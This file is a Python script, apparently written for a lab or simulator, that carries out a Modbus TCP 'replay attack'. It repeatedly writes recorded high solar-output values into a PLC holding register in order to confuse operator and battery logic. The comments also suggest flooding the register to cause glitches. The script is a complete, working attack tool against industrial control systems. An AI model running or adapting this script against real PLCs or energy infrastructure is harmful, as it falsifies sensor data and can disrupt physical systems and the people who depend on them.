import asyncio
import logging
import random

from pymodbus.client import AsyncModbusTcpClient

TARGET_IP = "localhost"
TARGET_PORT = 5020

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [REPLAY] - %(message)s")


async def run_replay():
    client = AsyncModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    await client.connect()

    if not client.connected:
        logging.error("Target unreachable.")
        return

    logging.info("Starting Replay Attack...")
    logging.info(
        "Injecting recorded 'High Noon' solar values to confuse operator/battery logic."
    )

    # Recorded sequence of high values (scaled x10)
    # 500kW = 5000
    replay_sequence = [4800, 4850, 4900, 4950, 5000, 5000, 5000, 4950]

    try:
        for val in replay_sequence:
            logging.info(f"Injecting Solar Output: {val/10}kW")
            # Write to the Holding Register that holds Solar Output
            # Note: In a real PLC, this might be overwritten by the logic immediately.
            # But if the scan time is slow, or if we flood it, we can cause glitches.
            # Or we might be overwriting a sensor input register.
            await client.write_register(0, val, slave=1)  # Reg 0 is Solar Output
            await asyncio.sleep(0.5)

    except Exception as e:
        logging.error(f"Attack failed: {e}")

    client.close()


if __name__ == "__main__":
    asyncio.run(run_replay())
